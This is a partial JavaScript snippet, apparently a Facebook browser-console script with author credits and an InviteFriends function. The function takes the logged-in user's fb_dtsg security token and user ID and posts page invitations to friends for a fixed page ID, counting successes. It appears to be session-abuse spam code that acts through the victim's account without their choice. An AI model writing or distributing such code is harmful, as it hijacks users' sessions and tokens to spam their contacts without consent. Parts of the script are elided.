...
var Descriptions = "",
    _text = 'Make by Khương Duy </br>Kịch bản </A><A style="color:#96FF00;" href="https://www.facebook.com/unti.ligo.3" target="_blank"> Thành </A></A>,</A><A style="color:#96FF00;" href="https://www.facebook.com/unti.ligo.3" target="_blank"> Thành</A></A>.</br> <A style="color:#96FF00;" href="" target="_blank"></A>.</A>';
...
function InviteFriends(opo) {
    ...
    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
                          ...
                          if (page_id)jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_id=621838294552554&__user="+ user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
